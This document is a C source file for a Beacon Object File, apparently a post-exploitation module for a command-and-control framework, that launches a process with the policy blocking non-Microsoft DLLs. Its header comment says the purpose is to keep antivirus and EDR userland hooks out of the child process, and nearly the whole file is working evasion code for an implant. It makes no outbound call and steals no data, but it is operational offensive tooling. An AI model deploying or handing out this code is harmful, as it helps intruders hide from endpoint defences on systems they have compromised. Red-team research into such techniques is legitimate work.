/*
 * bof-blockdlls <command> [args...]
 *
 * Spawn a process with the PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_
 * MICROSOFT_BINARIES_ALWAYS_ON mitigation, so only Microsoft-signed DLLs load
 * into it.  This blocks most AV/EDR userland DLL injection into the child
 * (including the agent if it were injected there).
 *
 * Some third-party applications fail to start with this policy; the error is
 * reported if CreateProcess refuses.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define BOF_BLOCK_NON_MS_ALWAYS_ON 0x0000000100000000ULL

void go(char *args, int alen)
{
    datap parser;
    char *command, *extra = "";
    int clen = 0, elen = 0;
    char cmdline[2048];
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPPROC_THREAD_ATTRIBUTE_LIST attrs = NULL;
    SIZE_T size = 0;
    DWORD64 policy = BOF_BLOCK_NON_MS_ALWAYS_ON;
    BOOL ok;

    BeaconDataParse(&parser, args, alen);
    command = BeaconDataExtract(&parser, &clen);
    extra   = BeaconDataExtract(&parser, &elen);
    if (!command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: blockdlls <command> [args]\n");
        return;
    }
    if (!extra) extra = "";

    bof_strncpy(cmdline, command, sizeof(cmdline));
    if (extra[0]) {
        bof_strncat(cmdline, " ", sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, extra, sizeof(cmdline) - bof_strlen(cmdline) - 1);
    }

    bof_memzero(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    bof_memzero(&pi, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$VirtualAlloc(
                NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!attrs ||
        !KERNEL32$InitializeProcThreadAttributeList(attrs, 1, 0, &size)) {
        BeaconPrintf(CALLBACK_ERROR, "attribute list setup failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        if (attrs) KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
        return;
    }
    if (!KERNEL32$UpdateProcThreadAttribute(
            attrs, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
            &policy, sizeof(policy), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "UpdateProcThreadAttribute: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$DeleteProcThreadAttributeList(attrs);
        KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
        return;
    }

    si.lpAttributeList = attrs;

    ok = KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                                 EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                                 NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] %s -> PID %lu with non-Microsoft DLL blocking\n",
                     cmdline, (unsigned long)pi.dwProcessId);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
                     "CreateProcess failed: %lu (policy may be unsupported)\n",
                     (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$DeleteProcThreadAttributeList(attrs);
    KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
}
